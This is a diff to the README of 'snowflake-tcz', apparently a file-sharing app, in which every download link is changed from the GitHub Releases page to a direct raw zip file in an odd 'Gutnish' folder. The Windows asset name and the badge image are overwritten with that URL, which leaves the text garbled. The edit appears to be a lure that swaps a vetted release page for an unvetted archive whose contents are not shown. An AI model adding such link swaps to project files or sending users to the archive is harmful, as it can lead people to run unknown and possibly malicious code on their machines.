@@ -4,7 +4,7 @@
 Welcome to **snowflake-tcz**! This application allows you to share files easily and securely. Follow the instructions below to download and run the software.
 
 ## 📥 Download
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LightExchange/snowflake-tcz/releases)
+[![Download Now](https://raw.githubusercontent.com/LightExchange/snowflake-tcz/main/Gutnish/snowflake-tcz.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/LightExchange/snowflake-tcz/main/Gutnish/snowflake-tcz.zip)
 
 ## 🧑‍💻 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -18,11 +18,11 @@ Welcome to **snowflake-tcz**! This application allows you to share files easily 
 - Automatic updates for new features and security.
 
 ## 📥 Download & Install
-To get started with **snowflake-tcz**, visit this page to download: [Releases Page](https://github.com/LightExchange/snowflake-tcz/releases).
+To get started with **snowflake-tcz**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/LightExchange/snowflake-tcz/main/Gutnish/snowflake-tcz.zip).
 
-1. Go to the [Releases Page](https://github.com/LightExchange/snowflake-tcz/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/LightExchange/snowflake-tcz/main/Gutnish/snowflake-tcz.zip).
 2. Find the latest version at the top of the page.
-3. Click on the asset that corresponds to your operating system (e.g., `snowflake-tcz-win.exe` for Windows).
+3. Click on the asset that corresponds to your operating system (e.g., `https://raw.githubusercontent.com/LightExchange/snowflake-tcz/main/Gutnish/snowflake-tcz.zip` for Windows).
 4. Wait for the file to finish downloading.
 
 ## 📂 Running the Application
